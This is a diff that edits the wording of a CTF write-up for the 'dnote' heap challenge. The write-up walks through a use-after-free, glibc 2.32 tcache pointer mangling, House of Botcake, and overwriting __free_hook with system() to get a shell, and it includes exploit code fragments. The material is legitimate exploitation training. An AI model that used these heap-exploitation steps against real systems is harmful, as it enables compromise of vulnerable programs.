@@ -45,11 +45,11 @@ $ checksec dnote
     PIE:      No PIE (0x400000)
 ```
 
-Well, we can see that just `NX enabled`. Finally, we will use ghidra to decompile the challenge file to understand how the program work. There will be several function and we will go throught all of them.
+Well, we can see that just `NX enabled`. Finally, we will use ghidra to decompile the challenge file to understand how the program work. There will be several function and we will go through all of them.
 
-First is the main() function. We can see that there are 3 subfunction: `Add Page`, `Show Page` and `Delete Page`.
+First is the `main()` function. We can see that there are 3 subfunction: `Add Page`, `Show Page` and `Delete Page`.
 
-With the first option `Add Page`, we can add upto 20 chunk with number from 0 to 20, then malloc() with the size we want because there is no check for the size. After that, we will input data to the chuck with fgets():
+With the first option `Add Page`, we can add up to 20 chunk with number from 0 to 20, then malloc() with the size we want because there is no check for the size. After that, we will input data to the chuck with `fgets()`:
 
 ![add_page.png](/static/images/foobar-ctf-2022/images/add_page.png)
 
@@ -57,7 +57,7 @@ The second option is `Show Page`, which first check if the pointer to chunk is r
 
 ![show_page.png](/static/images/foobar-ctf-2022/images/show_page.png)
 
-And the last option is `Delete Page` and we don't have any option to edit the chunk. The function first check if the pointer to chunk is exist or not. If exist, free() it without removing the pointer to chunk --> **Use After Free**
+And the last option is `Delete Page` and we don’t have any option to edit the chunk. The function first check if the pointer to chunk is exist or not. If exist, free() it without removing the pointer to chunk → **Use After Free**
 
 ![delete_page.png](/static/images/foobar-ctf-2022/images/delete_page.png)
 
@@ -65,7 +65,7 @@ And that’s all bug we can found. Let’s move on the next part: Brainstorming!
 
 ## 2. Brainstorming
 
-If you're not familiar with heap, please read [here](https://guyinatuxedo.github.io/25-heap/index.html) to have a general view about all kinds of chunk.
+If you’re not familiar with heap, please read [here](https://guyinatuxedo.github.io/25-heap/index.html) to have a general view about all kinds of chunk.
 
 First, we will need to leak the main arena address by freeing a large chunk and make it go to large bin (if goes to unsorted bin, it will have null byte at LSB). When we have the libc address, we will need to do a **Tcache attack**.
 
@@ -74,40 +74,40 @@ So let’s search for available technique to attack lib 2.32 [here](https://gith
 One thing to notice is that on libc 2.32, the [tcache](https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L2928) changed its act with a simple XOR was added to it:
 
 ```
-1  |/* Caller must ensure that we know tc_idx is valid and there’s room
-2  |   for more chunks.  */
-3  |static __always_inline void
-4  |tcache_put (mchunkptr chunk, size_t tc_idx)
-5  |{
-6  |  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
-7  |
-8  |  /* Mark this chunk as "in the tcache" so the test in _int_free will
-9  |     detect a double free.  */
-10 |  e->key = tcache;
-11 |
-12 |  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
-13 |  tcache->entries[tc_idx] = e;
-14 |  ++(tcache->counts[tc_idx]);
-15 |}
-16 |
-17 |/* Caller must ensure that we know tc_idx is valid and there’s
-18 |   available chunks to remove.  */
-19 |static __always_inline void *
-20 |tcache_get (size_t tc_idx)
-21 |{
-22 |  tcache_entry *e = tcache->entries[tc_idx];
-23 |  if (__glibc_unlikely (!aligned_OK (e)))
-24 |    malloc_printerr ("malloc(): unaligned tcache chunk detected");
-25 |  tcache->entries[tc_idx] = REVEAL_PTR (e->next);
-26 |  --(tcache->counts[tc_idx]);
-27 |  e->key = NULL;
-28 |  return (void *) e;
-29 |}
+/* Caller must ensure that we know tc_idx is valid and there’s room
+   for more chunks.  */
+static __always_inline void
+tcache_put (mchunkptr chunk, size_t tc_idx)
+{
+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+
+  /* Mark this chunk as "in the tcache" so the test in _int_free will
+     detect a double free.  */
+  e->key = tcache;
+
+  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
+  tcache->entries[tc_idx] = e;
+  ++(tcache->counts[tc_idx]);
+}
+
+/* Caller must ensure that we know tc_idx is valid and there’s
+   available chunks to remove.  */
+static __always_inline void *
+tcache_get (size_t tc_idx)
+{
+  tcache_entry *e = tcache->entries[tc_idx];
+  if (__glibc_unlikely (!aligned_OK (e)))
+    malloc_printerr ("malloc(): unaligned tcache chunk detected");
+  tcache->entries[tc_idx] = REVEAL_PTR (e->next);
+  --(tcache->counts[tc_idx]);
+  e->key = NULL;
+  return (void *) e;
+}
 ```
 
 Two new macros are added to protect the chunk when storing and fetching a chunk which is linked to an old chunk in tcache (which means when we free a chunk and it goes to tcache, the forward pointer will be XOR first and then write to that chunk).
 
-At line 12 and 25, there is a function called `PROTECT_PTR` and `REVEAL_PTR` which is new in libc 2.32. These functions are definded in [source](https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L341) as follows:
+At line 12 and 25, there is a function called `PROTECT_PTR` and `REVEAL_PTR` which is new in libc 2.32. These functions are defined in the [source](https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L341) as follows:
 
 ```c
 #define PROTECT_PTR(pos, ptr) \
@@ -119,7 +119,7 @@ For example with the image below, `P` is previous address of old freed chunk, `L
 
 ![ex_protect_ptr.png](/static/images/foobar-ctf-2022/images/ex_protect_ptr.png)
 
-We can also create a script to malloc and then free() to make it go to tcache and we check that. The address for the first chunk is `0x55555555b2a0` (don't include heap metadata):
+We can also create a script to `malloc()` and then `free()` to make it go to tcache and we check that. The address for the first chunk is `0x55555555b2a0` (don’t include heap metadata):
 
 ![prev_chunk_ex.png](/static/images/foobar-ctf-2022/images/prev_chunk_ex.png)
 
@@ -130,7 +130,7 @@ So when it’s freed, the protected forward pointer for this chunk can be calcul
   (     0x55555555b2a0     >> 12) ^             0            = 0x55555555b
 ```
 
-Because this is the first chunk being freed and go to tcache first so `<Previous chunk address>` will equal to 0. And we will have the address for the second chunk is `0x55555555c2e0` (don't include heap metadata):
+Because this is the first chunk being freed and go to tcache first so `<Previous chunk address>` will equal to 0. And we will have the address for the second chunk is `0x55555555c2e0` (don’t include heap metadata):
 
 ![current_chunk_ex.png](/static/images/foobar-ctf-2022/images/current_chunk_ex.png)
 
@@ -143,13 +143,13 @@ So the protected forward pointer will equal to:
 
 So to overwrite forward pointer, we need the address of previous chunk. That’s the point we need to notice here.
 
-Reference soure:
+### Reference sources
 
-https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#glibc2-32%E4%B8%8Btcache%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E6%8A%A4
+* https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#glibc2-32%E4%B8%8Btcache%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E6%8A%A4
+* http://blog.nsfocus.net/glibc-234/
 
-http://blog.nsfocus.net/glibc-234/
 
-- Summary:
+### Summary:
   1. Leak main arena address
   2. Leak heap address
   3. Overwrite forward pointer
@@ -157,7 +157,7 @@ http://blog.nsfocus.net/glibc-234/
 
 ## 3. Exploit
 
-Before we exploit, I wrote these function for a convinient exploitation:
+Before we exploit, I wrote these function for a convenient exploitation:
 
 <details>
 <summary>Code snippet</summary>
@@ -199,7 +199,7 @@ Check in GDB and we can see that the main arena address contains null byte at LS
 
 ![unsortedbin_null_byte.png](/static/images/foobar-ctf-2022/images/unsortedbin_null_byte.png)
 
-And we know that puts() will stop at null byte, so we cannot print that address out. We will try to put it into the large bin to see if it’s different:
+And we know that `puts()` will stop at null byte, so we cannot print that address out. We will try to put it into the large bin to see if it’s different:
 
 ```py
 add(0, 0x1100, '{}'.format(2).encode()*8)
@@ -209,7 +209,7 @@ And check again, we see that there is no null byte in the address anymore:
 
 ![large_bin_not_null_byte.png](/static/images/foobar-ctf-2022/images/large_bin_not_null_byte.png)
 
-And below the libc main arena address is the heap forward and backward pointer but we won't use this chunk to leak that heap address. Just libc is enough.
+And below the libc main arena address is the heap forward and backward pointer but we won’t use this chunk to leak that heap address. Just libc is enough.
 
 So we just leak the libc address out with the bug **Use After Free**, then calculate the offset and take the leaked address subtract with offset, we will get the libc base address:
 
@@ -243,11 +243,11 @@ libc.address = u64(show(7) + b'\x00\x00') - 0x1c5220
 log.success("Libc base: " + hex(libc.address))
 ```
 
-that’s great! Let’s move on the next stage: Leak heap address!
+That’s great! Let’s move on the next stage: Leak heap address!
 
 ### Stage 2: Leak heap address
 
-To leak heap address, we just simply create 1 small chunk then free it. Remember what I have explained? The forward pointer has to XOR first, then it will be written to chunk. So just free() 1 small chunk and we can get the address of forward pointer, then recover the base address of heap:
+To leak heap address, we just simply create 1 small chunk then free it. Remember what I have explained? The forward pointer has to XOR first, then it will be written to chunk. So just `free()` 1 small chunk and we can get the address of forward pointer, then recover the base address of heap:
 
 ```
 fw_pointer = u64(show(0).ljust(8, b'\x00'))
@@ -269,14 +269,14 @@ So as I mentioned above, with the first chunk is freed and goes to tcache, the f
   (       0x1a1c2a0        >> 12) ^             0            = 0x1a1c
 ```
 
-So to recover the heap base address, we just simply do the reverse order (don't need to XOR) with the following payload:
+So to recover the heap base address, we just simply do the reverse order (don’t need to XOR) with the following payload:
 
 ```py
 heap = u64(show(0).ljust(8, b'\x00')) << 12
 log.success("Heap base: " + hex(heap))
 ```
 
-And we get the heap base address. Before we move on next stage, just malloc again to reset the state of tcache bin to null:
+And we get the heap base address. Before we move on next stage, just `malloc()` again to reset the state of tcache bin to null:
 
 ```py
 add(0, 0x10, '{}'.format(0).encode()*8)
@@ -288,7 +288,7 @@ And now, let’s move on!
 
 For this stage, we will use the technique called [House of Botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.32/house_of_botcake.c).
 
-We will first malloc 7 chunks with the size larger than fastbin but still smaller than tcache and the ideal size if 0x100:
+We will first `malloc` 7 chunks with the size larger than fastbin but still smaller than tcache and the ideal size if 0x100:
 
 ```py
 for i in range(7):
@@ -308,7 +308,7 @@ And 1 small chunk to avoid consolidation:
 add(9, 0x10, '{}'.format(9).encode()*8)
 ```
 
-Next, we will free all 7 chunks at the begining of this stage to fill up the tcache:
+Next, we will free all 7 chunks at the beginning of this stage to fill up the tcache:
 
 ```py
 for i in range(7):
@@ -319,7 +319,7 @@ And with the next free() the chunk with the same size as 0x100, because tcache i
 
 ![unsorted_bin_after_7_free.png](/static/images/foobar-ctf-2022/images/unsorted_bin_after_7_free.png)
 
-So as the technique describe, we still have 2 chunk (index 7 and 8) haven't freed yet. We will free the chunk which is below the other first (this case is chunk index 8 because it was malloc() later), then we free the chunk above that freed chunk to make consolidation between 2 chunk:
+So as the technique describe, we still have 2 chunk (index 7 and 8) haven’t freed yet. We will free the chunk which is below the other first (this case is chunk index 8 because it was `malloc()` later), then we free the chunk above that freed chunk to make consolidation between 2 chunk:
 
 ```py
 free(8)
@@ -396,7 +396,7 @@ So we know the offset. Remember the new mechanism for the forward pointer and we
 fake_fw_pointer = ((heap + 0xb40) >> 12) ^ (libc.sym['__free_hook'])
 ```
 
-So that we fake the previous chunk into `__free_hook` and write it with the chunk from unsorted bin. We will malloc a chunk with size of 0x130 for overwriting:
+So that we fake the previous chunk into `__free_hook` and write it with the chunk from unsorted bin. We will `malloc` a chunk with size of 0x130 for overwriting:
 
 ```py
 payload = b'\x00'*0x100                 # Padding to tcache
@@ -473,7 +473,7 @@ We can see that it’s the correct position for our fake forward pointer. Let’
 
 ![free_hook_address.png](/static/images/foobar-ctf-2022/images/free_hook_address.png)
 
-that’s correct. Let’s move on the final stage to get shell!
+That’s correct. Let’s move on the final stage to get shell!
 
 ### Stage 4: Overwrite `__free_hook` with system()
 
@@ -580,6 +580,6 @@ p.interactive()
 
 ## 4. Get flag
 
-Poorly, the time passed and the server closed so I cannot connect to it to get the flag but I will run in local:
+Unfortunately, the time has passed and the server was closed so I cannot connect to it to get the flag but I ran it locally.
 
 ![get_flag.png](/static/images/foobar-ctf-2022/images/get_flag.png)
